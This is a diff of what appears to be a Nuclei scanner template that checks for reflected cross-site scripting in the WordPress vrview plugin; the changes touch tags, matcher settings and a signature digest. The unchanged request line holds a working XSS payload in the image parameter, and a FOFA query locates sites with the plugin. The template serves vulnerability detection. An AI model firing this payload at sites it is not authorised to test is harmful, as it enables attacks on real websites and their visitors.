@@ -11,7 +11,7 @@ info:
   metadata:
     max-request: 2
     fofa-query: body="/wp-content/plugins/vrview/"
-  tags: wp,wp-plugin,wordpress,vrview,xss,vuln
+  tags: wp,wp-plugin,wordpress,vrview,xss
 
 flow: http(1) && http(2)
 
@@ -33,7 +33,6 @@ http:
         GET /wp-content/plugins/vrview/vrview/?image=<img%20src=x%20onerror=alert(document.domain)> HTTP/1.1
         Host: {{Hostname}}
 
-    matchers-condition: and
     matchers:
       - type: word
         part: body
@@ -48,4 +47,4 @@ http:
       - type: status
         status:
           - 200
-# digest: 4a0a00473045022100c1ec273b004e3f192195d61fcbc8ecafef5be7a6e94b8ab30d62179e25e33b8302207b584954e58213664b9c0f06f52ee116f5a5446a5b02c4e93a940695448b2a97:922c64590222798bb761d5b6d8e72950
+# digest: 4a0a0047304502200454f65034e9ae8a6f5efc72820dc7a9bb5383e4b5c7a27929cdadc85f0b8a9a022100d53ea8937f49af8ad88bf509581c126b9fafe8b0b0d0130a4fefb8704da5a76f:922c64590222798bb761d5b6d8e72950
